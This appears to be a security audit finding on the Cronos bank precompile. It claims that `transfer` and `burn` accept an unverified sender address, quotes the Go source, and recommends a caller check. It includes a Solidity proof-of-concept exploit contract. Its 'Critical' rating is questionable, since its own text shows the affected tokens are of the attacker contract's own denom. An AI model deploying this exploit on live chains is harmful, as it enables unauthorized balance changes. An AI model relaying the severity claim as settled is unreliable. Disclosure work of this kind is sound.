### Title
Unauthorized Transfer of Native Tokens via Bank Precompile Missing Sender Authorization — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `transfer` method in the `BankContract` precompile accepts an arbitrary `sender` address as a calldata argument and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `sender == contract.Caller()`. Any unprivileged EVM contract can transfer `evm/<callerContract>` native tokens from any victim address to any destination without the victim's consent.

### Finding Description
The bank precompile at address `0x0000000000000000000000000000000000000064` exposes `mint`, `burn`, and `transfer` methods. For `mint` and `burn`, the denom is derived from `contract.Caller()` and the operation is scoped to the calling contract's own denom — this is by design. However, the `transfer` case has a distinct and critical gap:

```go
// x/cronos/keeper/precompiles/bank.go lines 167-200
case TransferMethodName:
    ...
    sender := args[0].(common.Address)   // taken from calldata — NOT verified
    recipient := args[1].(common.Address)
    amount := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())
    to := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())  // evm/<callerContract>
    ...
    bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

There is **no check** that `sender == contract.Caller()`. The denom is scoped to the calling contract (`evm/<callerContract>`), but the `from` address is fully attacker-controlled. Any contract can drain `evm/<contract>` tokens from any address that holds them.

The same issue exists for `burn`: the first argument (confusingly named `recipient`) is the address to burn FROM, and there is no check that it equals `contract.Caller()`. [2](#0-1) 

The intended usage pattern (from `TestBank.sol`) is for the calling contract to pass `msg.sender` as the sender, relying on the contract to enforce authorization. The precompile itself enforces nothing. [3](#0-2) 

The `IBankModule` interface exposes these methods to any EVM contract with no restriction: [4](#0-3) 

### Impact Explanation
`evm/<address>` tokens are native Cosmos bank module tokens managed by the bank precompile — they are precompile-controlled assets. A malicious contract can:

1. **Unauthorized transfer**: Call `bank.transfer(victimAddr, attackerAddr, amount)` to move `evm/<maliciousContract>` tokens from any victim to any destination without consent.
2. **Unauthorized burn**: Call `bank.burn(victimAddr, amount)` to destroy `evm/<maliciousContract>` tokens held by any victim without consent.

This constitutes an unauthorized balance/accounting change for precompile-controlled assets, matching the Critical impact scope.

### Likelihood Explanation
Any unprivileged EVM user can deploy a contract and immediately call the bank precompile's `transfer` or `burn` with an arbitrary `sender`. No special role, key, or governance action is required. The only precondition is that the victim holds `evm/<attackerContract>` tokens — which the attacker can arrange by first calling `bank.mint(victimAddr, amount)` (also unrestricted) to seed the victim's balance.

### Recommendation
In the `transfer` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender is not authenticated")
}
```

In the `burn` case, enforce that the address to burn from equals `contract.Caller()`. This mirrors the authorization pattern already used in other Cronos precompiles (e.g., `utils.go` `exec` function checks `caller != e.caller`). [5](#0-4) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
}

contract BankPrecompileExploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: seed victim with evm/<this> tokens
    function seedVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim's evm/<this> tokens without consent
    function drainVictim(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
        // OR: bank.burn(victim, amount);
    }
}
```

Calling `seedVictim(victim, 1000)` followed by `drainVictim(victim, attacker, 1000)` transfers the victim's `evm/<exploit_contract>` native tokens to the attacker with no approval from the victim. Both calls succeed because `BankContract.Run()` performs no `sender == contract.Caller()` check. [6](#0-5)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L103-156)
```go
func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-200)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
```

**File:** integration_tests/contracts/contracts/TestBank.sol (L35-38)
```text
    function nativeTransfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return bank.transfer(msg.sender, recipient, amount);
    }
```

**File:** x/cronos/events/bindings/src/Bank.sol (L1-9)
```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address,uint256) external payable returns (bool);
    function balanceOf(address,address) external view returns (uint256);
    function burn(address,uint256) external payable returns (bool);
    function transfer(address,address,uint256) external payable returns (bool);
}
```

**File:** x/cronos/keeper/precompiles/utils.go (L46-49)
```go
	caller := common.BytesToAddress(signers[0])
	if caller != e.caller {
		return nil, fmt.Errorf("caller is not authenticated: expected %s, got %s", e.caller.Hex(), caller.Hex())
	}
```
